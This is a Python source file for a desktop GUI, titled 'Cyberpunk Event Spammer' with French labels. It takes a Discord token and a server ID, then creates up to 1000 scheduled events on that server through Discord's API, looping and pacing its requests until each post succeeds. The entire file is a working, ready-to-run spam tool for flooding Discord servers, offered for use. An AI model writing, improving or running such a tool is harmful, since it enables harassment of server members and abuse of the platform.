import sys
import time
import requests
from pytz import timezone as tz
from datetime import datetime, timedelta
from dataclasses import dataclass
from enum import Enum

from PySide6.QtWidgets import (
    QApplication, QWidget, QLabel, QVBoxLayout, QHBoxLayout,
    QLineEdit, QPushButton, QTextEdit, QSpinBox
)
from PySide6.QtCore import Qt, QThread, Signal

class ResponseType(Enum):
    OK = 200
    CREATED = 201
    NO_CONTENT = 204
    BAD_REQUEST = 400
    UNAUTHORIZED = 401
    FORBIDDEN = 403
    NOT_FOUND = 404
    METHOD_NOT_ALLOWED = 405
    TOO_MANY_REQUESTS = 429
    INTERNAL_SERVER_ERROR = 500

@dataclass
class ScheduledEvent:
    name: str
    description: str
    guild_id: int
    start_time: str
    end_time: str
    location: str

class EventSpammer:
    def __init__(self, token: str) -> None:
        self.token = token

    def create_event(self, event: ScheduledEvent) -> requests.Response:
        data = {
            "name": event.name,
            "description": event.description,
            "privacy_level": 2,
            "scheduled_start_time": event.start_time,
            "scheduled_end_time": event.end_time,
            "entity_type": 3,
            "channel_id": None,
            "entity_metadata": {
                "location": event.location
            }
        }

        headers = {
            'Authorization': self.token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0',
        }

        return requests.post(f'https://discord.com/api/v9/guilds/{event.guild_id}/scheduled-events', headers=headers, json=data)

class SpammerThread(QThread):
    log_signal = Signal(str)

    def __init__(self, token, guild_id, name, description, location, amount):
        super().__init__()
        self.token = token
        self.guild_id = guild_id
        self.name = name
        self.description = description
        self.location = location
        self.amount = amount

    def run(self):
        spammer = EventSpammer(self.token)
        actual_time = datetime.now(tz=tz('UTC'))

        ETA = self.amount * 5
        minutes = ETA // 60
        seconds = ETA % 60
        self.log_signal.emit(f"[⚙️] Lancement du spam d'événements - ETA: {minutes}m {seconds}s")

        count = self.amount
        while count > 0:
            event = ScheduledEvent(
                name=self.name,
                description=self.description,
                guild_id=self.guild_id,
                start_time=(actual_time + timedelta(minutes=10)).strftime("%Y-%m-%dT%H:%M:%S.000Z"),
                end_time=(actual_time + timedelta(days=365)).strftime("%Y-%m-%dT%H:%M:%S.000Z"),
                location=self.location
            )
            r = spammer.create_event(event)
            status = ResponseType(r.status_code).name if r.status_code in ResponseType._value2member_map_ else f"UNKNOWN ({r.status_code})"
            self.log_signal.emit(f"[📡] Status: {r.status_code} - {status}")
            if r.status_code == 200 or r.status_code == 201:
                count -= 1
            time.sleep(8)

        self.log_signal.emit("[✅] Spam terminé.")

class CyberpunkGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("🟣 Cyberpunk Event Spammer")
        self.setStyleSheet("""
            QWidget {
                background-color: #0f0f0f;
                color: #39ff14;
                font-family: Consolas;
                font-size: 14px;
            }
            QPushButton {
                background-color: #222;
                border: 1px solid #39ff14;
                padding: 8px;
            }
            QPushButton:hover {
                background-color: #111;
            }
            QLineEdit, QSpinBox {
                background-color: #1e1e1e;
                border: 1px solid #39ff14;
                color: #39ff14;
            }
            QTextEdit {
                background-color: #1a1a1a;
                border: 1px solid #39ff14;
                color: #39ff14;
            }
        """)
        self.setup_ui()

    def setup_ui(self):
        layout = QVBoxLayout()

        self.token_input = self.add_input_field(layout, "🔑 Token du bot")
        self.guild_input = self.add_input_field(layout, "🏰 Guild ID (Serveur)")
        self.name_input = self.add_input_field(layout, "📛 Nom de l'événement")
        self.desc_input = self.add_input_field(layout, "📝 Description")
        self.location_input = self.add_input_field(layout, "📍 Lien / Lieu")
        self.amount_input = self.add_spinbox(layout, "🔁 Nombre d'événements", 1, 1000)

        self.start_button = QPushButton("🚀 Lancer le Spam")
        self.start_button.clicked.connect(self.start_spam)
        layout.addWidget(self.start_button)

        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        layout.addWidget(self.log_area)

        self.setLayout(layout)

    def add_input_field(self, layout, label):
        box = QVBoxLayout()
        box.addWidget(QLabel(label))
        line_edit = QLineEdit()
        box.addWidget(line_edit)
        layout.addLayout(box)
        return line_edit

    def add_spinbox(self, layout, label, min_val, max_val):
        box = QVBoxLayout()
        box.addWidget(QLabel(label))
        spin = QSpinBox()
        spin.setRange(min_val, max_val)
        box.addWidget(spin)
        layout.addLayout(box)
        return spin

    def start_spam(self):
        token = self.token_input.text()
        guild_id = int(self.guild_input.text())
        name = self.name_input.text()
        desc = self.desc_input.text()
        loc = self.location_input.text()
        amount = self.amount_input.value()

        self.thread = SpammerThread(token, guild_id, name, desc, loc, amount)
        self.thread.log_signal.connect(self.log_area.append)
        self.thread.start()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = CyberpunkGUI()
    window.resize(600, 600)
    window.show()
    sys.exit(app.exec())
